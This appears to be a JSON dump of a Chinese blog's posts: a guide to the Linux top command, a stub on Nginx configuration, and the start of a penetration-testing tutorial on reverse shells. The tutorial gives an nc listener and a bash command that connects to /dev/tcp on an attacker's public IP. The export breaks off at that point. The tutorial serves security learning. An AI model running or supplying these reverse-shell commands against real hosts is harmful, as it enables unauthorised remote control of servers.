|\n\n这里要说明的是不能用windows的内存概念理解这些数据，如果按照windows的方式此台服务器“危矣”。\n\n\n对于内存监控，在top里我们要时刻监控第五行swap交换分区的used，如果这个数值在不断的变化，说明内核在不断进行内存和swap的数据交换，这是真正的内存不够用了。\n\n\n### 5、各进程的状态监控\n\n第六行是空行，第七行开始是个任务的状态监控。\n\n```bash\n  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                                \n    1 root      20   0   54428   5512   3032 S  0.0  0.3  10:29.07 systemd                                \n    2 root      20   0       0      0      0 S  0.0  0.0   0:00.90 kthreadd                               \n    3 root      20   0       0      0      0 S  0.0  0.0   0:25.90 ksoftirqd/0                            \n    5 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kworker/0:0H                           \n    7 root      rt   0       0      0      0 S  0.0  0.0   0:00.00 migration/0                            \n    8 root      20   0       0      0      0 S  0.0  0.0   0:00.00 rcu_bh                                 \n    9 root      20   0       0      0      0 S  0.0  0.0   1:22.61 rcu_sched                              \n   10 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 lru-add-drain                          \n   11 root      rt   0       0      0      0 S  0.0  0.0   0:36.39 watchdog/0                             \n   13 root      20   0       0      0      0 S  0.0  0.0   0:00.00 kdevtmpfs                              \n   14 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 netns                                  \n   15 root      20   0       0      0      0 S  0.0  0.0   0:01.43 khungtaskd                             \n   16 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 writeback                              \n   17 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kintegrityd                            \n   18 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset                                 \n   19 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset                                 \n   20 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset                                 \n   21 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kblockd                                \n   22 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 md                                     \n   23 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 edac-poller                            \n   24 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 watchdogd                              \n   30 root      20   0       0      0      0 S  0.0  0.0   0:26.98 kswapd0            \n```\n\nPID:  进程ID，进程的唯一标识\nUSER： 进程所有者的实际用户名\nPR： 进程的调度优先级，这些值中有些是rt，表示这些进程运行在实时态\nNI： 进程的nice值（优先级）越小的值意味着越高的优先级。负值表示高优先级，正值表示低优先级\nVIRT： 进程使用的虚拟内存。进程使用的虚拟内存总量，单位是kb，VIRT=SWAP+RES\nRES: 驻留内存大小，驻留内存是任务使用的非交换物理内存大小。进程使用的、未被换出的物理内存大小，单位是kb，RES=CODE+DATA\nSHR： SHR是进程使用的共享内存。\nS： 这个是进程的状态。它有以下不同的值：\n  * D - 不可中断的睡眠态\n  * R - 运行态\n  * S - 睡眠态\n  * T - 被跟踪或已停止\n  * Z - 僵尸态\n%CPU： 自从上一次更新时到现在任务所使用的CPU时间百分比\n%MEM： 进程使用的可用物理内存百分比\nTIME+： 任务启动后到现在所使用的全部CPU时间，精确到百分之一秒。\nCOMMAND：运行进程所使用的命令。进程名称（命令名/命令行）\n\n还有许多在默认情况下不会显示的输出，他们可以显示进程的页错误、有效组、组ID和其他更多的信息。\n\n\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"Linux-top-命令详解","published":1,"updated":"2019-09-03T04:38:26.703Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2g3000ao25tkts1qlap","content":"<p>Linux系统中，top命令经常用来监控Linux的系统状况。可以通过top命令查看系统的CPU、内存、运行时间、线程信息等。通过top命令可以有效分析系统的性能瓶颈在哪里。</p>\n<h2 id=\"一、-top命令解释\"><a href=\"#一、-top命令解释\" class=\"headerlink\" title=\"一、 top命令解释\"></a>一、 top命令解释</h2><p>在Linux系统中执行top命令，就会进入如下界面，下面我们来逐行分析每行代表的意义。</p>\n<img src=\"/posts/2019-02-20-Linux-top-命令详解/top命令.png\">\n<h3 id=\"1、-系统运行时间及平均负载\"><a href=\"#1、-系统运行时间及平均负载\" class=\"headerlink\" title=\"1、 系统运行时间及平均负载\"></a>1、 系统运行时间及平均负载</h3><p>top命令的第一行表示的是系统的运行时间及平均负载，与uptime命令有相似的输出。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> top - 17:05:18 up 190 days,  3:54,  1 user,  load average: 0.00, 0.02, 0.05</span><br><span class=\"line\">-- 17:05:18            系统的当前时间</span><br><span class=\"line\">-- up 190 days,  3:54  系统已经运行的时间 190天3小时54分钟，期间没有重启</span><br><span class=\"line\">-- 1 user              系统当前登录用户数 表示系统当前只有一个用户登录</span><br><span class=\"line\">-- load average: 0.00, 0.02, 0.05 </span><br><span class=\"line\">\t\t  \tload average后面的三个数分别是5分钟、10分钟、15分钟的负载情况</span><br></pre></td></tr></table></figure>\n<p>load average数据是每隔5秒钟检查一次活跃的进程数，然后按照特定算法计算出的数值。如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。</p>\n<h3 id=\"2、任务\"><a href=\"#2、任务\" class=\"headerlink\" title=\"2、任务\"></a>2、任务</h3><p>第二行显示的是任务或者进程的总结。进程可以处于不同的状态，这里显示了全部进程的数量。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Tasks:   65 total,   1 running,   64 sleeping,   0 stopped,   0 zombie</span><br><span class=\"line\"><span class=\"comment\"># 总共有65个进程，1个正在运行， 64个休眠，0个停止，0个僵尸进程</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"3、CPU状态\"><a href=\"#3、CPU状态\" class=\"headerlink\" title=\"3、CPU状态\"></a>3、CPU状态</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%Cpu(s):  0.9 us,  1.2 sy,  0.0 ni, 97.6 id,  0.1 wa,  0.0 hi,  0.2 si,  0.0 st</span><br></pre></td></tr></table></figure>\n<p>这里显示的是不同模式下所占CPU时间百分比，不同CPU时间表示：</p>\n<ul>\n<li>us   user, 运行用户进程的CPU时间，消耗在用户空间的时间</li>\n<li>sy   system，运行内核进程的CPU时间，即消耗在内核空间的时间</li>\n<li>ni   niced，运行已调整优先级的用户进程的CPU时间</li>\n<li>id   idle，空闲CPU百分比，这个值越低，表示cpu越忙</li>\n<li>wa   wait，用于等待IO完成的CPU时间百分比，这个值越高说明外接设备有问题</li>\n<li>hi   hardware interrupt，处理硬件中断的CPU时间</li>\n<li>si   software interrupt，处理软中断的CPU时间</li>\n<li>st   虚拟机被hypervisor偷去的CPU时间（如果当前处于一个hypervisor的虚拟机，实际上hypervisor也是要消耗一部分CPU时间的）。</li>\n</ul>\n<p>在这里CPU的使用比率和windows概念不同，如果你不理解用户空间和内核空间，需要充电了。</p>\n<h3 id=\"4、内存使用\"><a href=\"#4、内存使用\" class=\"headerlink\" title=\"4、内存使用\"></a>4、内存使用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">KiB Mem:   2027864 total,  1945796 used,    82068 free,    15064 buffers</span><br><span class=\"line\">KiB Swap:  1048572 total,    87168 used,   961404 free.   398840 cached Mem</span><br></pre></td></tr></table></figure>\n<p>这两行显示的是内存使用率，有点像free命令。第一行是物理内存使用，第二行是虚拟内存使用（交换空间）。</p>\n<p>内存显示如下： </p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>全部可用内存</th>\n<th>已使用内存</th>\n<th>空闲内存</th>\n<th>缓冲内存</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>物理内存</td>\n<td>物理内存总量2027864</td>\n<td>使用中的内存总量1945796</td>\n<td>空闲内存总量82068</td>\n<td>缓存的内存量15064</td>\n</tr>\n<tr>\n<td>交换分区</td>\n<td>交换分区总量1048572</td>\n<td>使用的交换分区总量87168</td>\n<td>空闲交换分区总量961404</td>\n<td>缓存的交换区总量398840</td>\n</tr>\n</tbody>\n</table>\n<p>这里要说明的是不能用windows的内存概念理解这些数据，如果按照windows的方式此台服务器“危矣”。</p>\n<p>对于内存监控，在top里我们要时刻监控第五行swap交换分区的used，如果这个数值在不断的变化，说明内核在不断进行内存和swap的数据交换，这是真正的内存不够用了。</p>\n<h3 id=\"5、各进程的状态监控\"><a href=\"#5、各进程的状态监控\" class=\"headerlink\" title=\"5、各进程的状态监控\"></a>5、各进程的状态监控</h3><p>第六行是空行，第七行开始是个任务的状态监控。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                                </span><br><span class=\"line\">  1 root      20   0   54428   5512   3032 S  0.0  0.3  10:29.07 systemd                                </span><br><span class=\"line\">  2 root      20   0       0      0      0 S  0.0  0.0   0:00.90 kthreadd                               </span><br><span class=\"line\">  3 root      20   0       0      0      0 S  0.0  0.0   0:25.90 ksoftirqd/0                            </span><br><span class=\"line\">  5 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kworker/0:0H                           </span><br><span class=\"line\">  7 root      rt   0       0      0      0 S  0.0  0.0   0:00.00 migration/0                            </span><br><span class=\"line\">  8 root      20   0       0      0      0 S  0.0  0.0   0:00.00 rcu_bh                                 </span><br><span class=\"line\">  9 root      20   0       0      0      0 S  0.0  0.0   1:22.61 rcu_sched                              </span><br><span class=\"line\"> 10 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 lru-add-drain                          </span><br><span class=\"line\"> 11 root      rt   0       0      0      0 S  0.0  0.0   0:36.39 watchdog/0                             </span><br><span class=\"line\"> 13 root      20   0       0      0      0 S  0.0  0.0   0:00.00 kdevtmpfs                              </span><br><span class=\"line\"> 14 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 netns                                  </span><br><span class=\"line\"> 15 root      20   0       0      0      0 S  0.0  0.0   0:01.43 khungtaskd                             </span><br><span class=\"line\"> 16 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 writeback                              </span><br><span class=\"line\"> 17 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kintegrityd                            </span><br><span class=\"line\"> 18 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset                                 </span><br><span class=\"line\"> 19 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset                                 </span><br><span class=\"line\"> 20 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset                                 </span><br><span class=\"line\"> 21 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kblockd                                </span><br><span class=\"line\"> 22 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 md                                     </span><br><span class=\"line\"> 23 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 edac-poller                            </span><br><span class=\"line\"> 24 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 watchdogd                              </span><br><span class=\"line\"> 30 root      20   0       0      0      0 S  0.0  0.0   0:26.98 kswapd0</span><br></pre></td></tr></table></figure>\n<p>PID:  进程ID，进程的唯一标识<br>USER： 进程所有者的实际用户名<br>PR： 进程的调度优先级，这些值中有些是rt，表示这些进程运行在实时态<br>NI： 进程的nice值（优先级）越小的值意味着越高的优先级。负值表示高优先级，正值表示低优先级<br>VIRT： 进程使用的虚拟内存。进程使用的虚拟内存总量，单位是kb，VIRT=SWAP+RES<br>RES: 驻留内存大小，驻留内存是任务使用的非交换物理内存大小。进程使用的、未被换出的物理内存大小，单位是kb，RES=CODE+DATA<br>SHR： SHR是进程使用的共享内存。<br>S： 这个是进程的状态。它有以下不同的值：</p>\n<ul>\n<li>D - 不可中断的睡眠态</li>\n<li>R - 运行态</li>\n<li>S - 睡眠态</li>\n<li>T - 被跟踪或已停止</li>\n<li>Z - 僵尸态<br>%CPU： 自从上一次更新时到现在任务所使用的CPU时间百分比<br>%MEM： 进程使用的可用物理内存百分比<br>TIME+： 任务启动后到现在所使用的全部CPU时间，精确到百分之一秒。<br>COMMAND：运行进程所使用的命令。进程名称（命令名/命令行）</li>\n</ul>\n<p>还有许多在默认情况下不会显示的输出，他们可以显示进程的页错误、有效组、组ID和其他更多的信息。</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p>Linux系统中，top命令经常用来监控Linux的系统状况。可以通过top命令查看系统的CPU、内存、运行时间、线程信息等。通过top命令可以有效分析系统的性能瓶颈在哪里。</p>\n<h2 id=\"一、-top命令解释\"><a href=\"#一、-top命令解释\" class=\"headerlink\" title=\"一、 top命令解释\"></a>一、 top命令解释</h2><p>在Linux系统中执行top命令，就会进入如下界面，下面我们来逐行分析每行代表的意义。</p>\n<img src=\"/posts/2019-02-20-Linux-top-命令详解/top命令.png\">\n<h3 id=\"1、-系统运行时间及平均负载\"><a href=\"#1、-系统运行时间及平均负载\" class=\"headerlink\" title=\"1、 系统运行时间及平均负载\"></a>1、 系统运行时间及平均负载</h3><p>top命令的第一行表示的是系统的运行时间及平均负载，与uptime命令有相似的输出。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> top - 17:05:18 up 190 days,  3:54,  1 user,  load average: 0.00, 0.02, 0.05</span><br><span class=\"line\">-- 17:05:18            系统的当前时间</span><br><span class=\"line\">-- up 190 days,  3:54  系统已经运行的时间 190天3小时54分钟，期间没有重启</span><br><span class=\"line\">-- 1 user              系统当前登录用户数 表示系统当前只有一个用户登录</span><br><span class=\"line\">-- load average: 0.00, 0.02, 0.05 </span><br><span class=\"line\">\t\t  \tload average后面的三个数分别是5分钟、10分钟、15分钟的负载情况</span><br></pre></td></tr></table></figure>\n<p>load average数据是每隔5秒钟检查一次活跃的进程数，然后按照特定算法计算出的数值。如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。</p>\n<h3 id=\"2、任务\"><a href=\"#2、任务\" class=\"headerlink\" title=\"2、任务\"></a>2、任务</h3><p>第二行显示的是任务或者进程的总结。进程可以处于不同的状态，这里显示了全部进程的数量。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Tasks:   65 total,   1 running,   64 sleeping,   0 stopped,   0 zombie</span><br><span class=\"line\"><span class=\"comment\"># 总共有65个进程，1个正在运行， 64个休眠，0个停止，0个僵尸进程</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"3、CPU状态\"><a href=\"#3、CPU状态\" class=\"headerlink\" title=\"3、CPU状态\"></a>3、CPU状态</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%Cpu(s):  0.9 us,  1.2 sy,  0.0 ni, 97.6 id,  0.1 wa,  0.0 hi,  0.2 si,  0.0 st</span><br></pre></td></tr></table></figure>\n<p>这里显示的是不同模式下所占CPU时间百分比，不同CPU时间表示：</p>\n<ul>\n<li>us   user, 运行用户进程的CPU时间，消耗在用户空间的时间</li>\n<li>sy   system，运行内核进程的CPU时间，即消耗在内核空间的时间</li>\n<li>ni   niced，运行已调整优先级的用户进程的CPU时间</li>\n<li>id   idle，空闲CPU百分比，这个值越低，表示cpu越忙</li>\n<li>wa   wait，用于等待IO完成的CPU时间百分比，这个值越高说明外接设备有问题</li>\n<li>hi   hardware interrupt，处理硬件中断的CPU时间</li>\n<li>si   software interrupt，处理软中断的CPU时间</li>\n<li>st   虚拟机被hypervisor偷去的CPU时间（如果当前处于一个hypervisor的虚拟机，实际上hypervisor也是要消耗一部分CPU时间的）。</li>\n</ul>\n<p>在这里CPU的使用比率和windows概念不同，如果你不理解用户空间和内核空间，需要充电了。</p>\n<h3 id=\"4、内存使用\"><a href=\"#4、内存使用\" class=\"headerlink\" title=\"4、内存使用\"></a>4、内存使用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">KiB Mem:   2027864 total,  1945796 used,    82068 free,    15064 buffers</span><br><span class=\"line\">KiB Swap:  1048572 total,    87168 used,   961404 free.   398840 cached Mem</span><br></pre></td></tr></table></figure>\n<p>这两行显示的是内存使用率，有点像free命令。第一行是物理内存使用，第二行是虚拟内存使用（交换空间）。</p>\n<p>内存显示如下： </p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>全部可用内存</th>\n<th>已使用内存</th>\n<th>空闲内存</th>\n<th>缓冲内存</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>物理内存</td>\n<td>物理内存总量2027864</td>\n<td>使用中的内存总量1945796</td>\n<td>空闲内存总量82068</td>\n<td>缓存的内存量15064</td>\n</tr>\n<tr>\n<td>交换分区</td>\n<td>交换分区总量1048572</td>\n<td>使用的交换分区总量87168</td>\n<td>空闲交换分区总量961404</td>\n<td>缓存的交换区总量398840</td>\n</tr>\n</tbody>\n</table>\n<p>这里要说明的是不能用windows的内存概念理解这些数据，如果按照windows的方式此台服务器“危矣”。</p>\n<p>对于内存监控，在top里我们要时刻监控第五行swap交换分区的used，如果这个数值在不断的变化，说明内核在不断进行内存和swap的数据交换，这是真正的内存不够用了。</p>\n<h3 id=\"5、各进程的状态监控\"><a href=\"#5、各进程的状态监控\" class=\"headerlink\" title=\"5、各进程的状态监控\"></a>5、各进程的状态监控</h3><p>第六行是空行，第七行开始是个任务的状态监控。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                                </span><br><span class=\"line\">  1 root      20   0   54428   5512   3032 S  0.0  0.3  10:29.07 systemd                                </span><br><span class=\"line\">  2 root      20   0       0      0      0 S  0.0  0.0   0:00.90 kthreadd                               </span><br><span class=\"line\">  3 root      20   0       0      0      0 S  0.0  0.0   0:25.90 ksoftirqd/0                            </span><br><span class=\"line\">  5 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kworker/0:0H                           </span><br><span class=\"line\">  7 root      rt   0       0      0      0 S  0.0  0.0   0:00.00 migration/0                            </span><br><span class=\"line\">  8 root      20   0       0      0      0 S  0.0  0.0   0:00.00 rcu_bh                                 </span><br><span class=\"line\">  9 root      20   0       0      0      0 S  0.0  0.0   1:22.61 rcu_sched                              </span><br><span class=\"line\"> 10 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 lru-add-drain                          </span><br><span class=\"line\"> 11 root      rt   0       0      0      0 S  0.0  0.0   0:36.39 watchdog/0                             </span><br><span class=\"line\"> 13 root      20   0       0      0      0 S  0.0  0.0   0:00.00 kdevtmpfs                              </span><br><span class=\"line\"> 14 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 netns                                  </span><br><span class=\"line\"> 15 root      20   0       0      0      0 S  0.0  0.0   0:01.43 khungtaskd                             </span><br><span class=\"line\"> 16 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 writeback                              </span><br><span class=\"line\"> 17 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kintegrityd                            </span><br><span class=\"line\"> 18 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset                                 </span><br><span class=\"line\"> 19 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset                                 </span><br><span class=\"line\"> 20 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset                                 </span><br><span class=\"line\"> 21 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kblockd                                </span><br><span class=\"line\"> 22 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 md                                     </span><br><span class=\"line\"> 23 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 edac-poller                            </span><br><span class=\"line\"> 24 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 watchdogd                              </span><br><span class=\"line\"> 30 root      20   0       0      0      0 S  0.0  0.0   0:26.98 kswapd0</span><br></pre></td></tr></table></figure>\n<p>PID:  进程ID，进程的唯一标识<br>USER： 进程所有者的实际用户名<br>PR： 进程的调度优先级，这些值中有些是rt，表示这些进程运行在实时态<br>NI： 进程的nice值（优先级）越小的值意味着越高的优先级。负值表示高优先级，正值表示低优先级<br>VIRT： 进程使用的虚拟内存。进程使用的虚拟内存总量，单位是kb，VIRT=SWAP+RES<br>RES: 驻留内存大小，驻留内存是任务使用的非交换物理内存大小。进程使用的、未被换出的物理内存大小，单位是kb，RES=CODE+DATA<br>SHR： SHR是进程使用的共享内存。<br>S： 这个是进程的状态。它有以下不同的值：</p>\n<ul>\n<li>D - 不可中断的睡眠态</li>\n<li>R - 运行态</li>\n<li>S - 睡眠态</li>\n<li>T - 被跟踪或已停止</li>\n<li>Z - 僵尸态<br>%CPU： 自从上一次更新时到现在任务所使用的CPU时间百分比<br>%MEM： 进程使用的可用物理内存百分比<br>TIME+： 任务启动后到现在所使用的全部CPU时间，精确到百分之一秒。<br>COMMAND：运行进程所使用的命令。进程名称（命令名/命令行）</li>\n</ul>\n<p>还有许多在默认情况下不会显示的输出，他们可以显示进程的页错误、有效组、组ID和其他更多的信息。</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"Nginx 配置详解","date":"2019-05-06T03:57:56.000Z","_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n在用yum或apt安装Nginx之后，大部分情况下，已经可以作为一个性能非常好的web服务器了。而真正想要配置一个高性能的Nginx服务器，还需要优化大量的配置，本篇文章通过介绍nginx各个配置，为后续优化做记录。\n\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/Nginx-配置详解.md","raw":"---\ntitle: Nginx 配置详解\ndate: 2019-05-06 11:57:56\ntags: ['nginx','config']\ncategories: \"Nginx\"\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n在用yum或apt安装Nginx之后，大部分情况下，已经可以作为一个性能非常好的web服务器了。而真正想要配置一个高性能的Nginx服务器，还需要优化大量的配置，本篇文章通过介绍nginx各个配置，为后续优化做记录。\n\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"Nginx-配置详解","published":1,"updated":"2019-06-26T08:55:54.597Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2g5000co25t29fcnbsl","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>在用yum或apt安装Nginx之后，大部分情况下，已经可以作为一个性能非常好的web服务器了。而真正想要配置一个高性能的Nginx服务器，还需要优化大量的配置，本篇文章通过介绍nginx各个配置，为后续优化做记录。</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>在用yum或apt安装Nginx之后，大部分情况下，已经可以作为一个性能非常好的web服务器了。而真正想要配置一个高性能的Nginx服务器，还需要优化大量的配置，本篇文章通过介绍nginx各个配置，为后续优化做记录。</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"Linux反弹shell的三种方法","date":"2018-11-06T03:55:30.000Z","_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x01 前言\n{% endnote %}\n</div>\n\n在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？\n\n而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外部机器来获取一个shell。\n\n反弹shell通常是外网渗透的最后一步，也是内网渗透的第一步。反弹shell顾名思义，有两个关键词—反弹和shell。\n\n反弹：利用命令执行/代码执行/Webshell/redis未授权访问写入crontab等漏洞，使得目标服务器发出主动连接请求，从而绕过防火墙的入站访问控制规则则。\nShell：是服务器shell进程stdin/stdout/stderr重定向到攻击端。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x02 获取shell\n{% endnote %}\n</div>\n\n通过上面的解释，可以知道，反弹shell需要一个外部可访问的服务器，即需要一个有公网IP访问的服务器，作为黑客的攻击服务器。\n\n我这里用自己的VPS机器作为一个攻击机器（IP: 130.211.244.96），操作系统是Centos7。用一个局域网虚拟机作为一个有漏洞的受害机器，即被攻击机器（IP: 192.168.6.220)，操作系统也是Centos7。\n\n#### 通过bash反弹shell\n\n第一种方法是直接利用bash进行反向shell的连接。首先在黑客的攻击机器130.211.244.96开启监听端口，监听来自外部的反向连接。打开终端，执行命令`nc -lvvp 7777`,这里用nc监听130.211.244.96的7777端口（更多的nc使用方法请自行了解）。之后在被攻击机器上即受害机器上192.168.6.220执行反向连接的bash命令`bash -i >$ /dev/tcp/130.211.244.96/7777 0>&1`。\n\n`bash 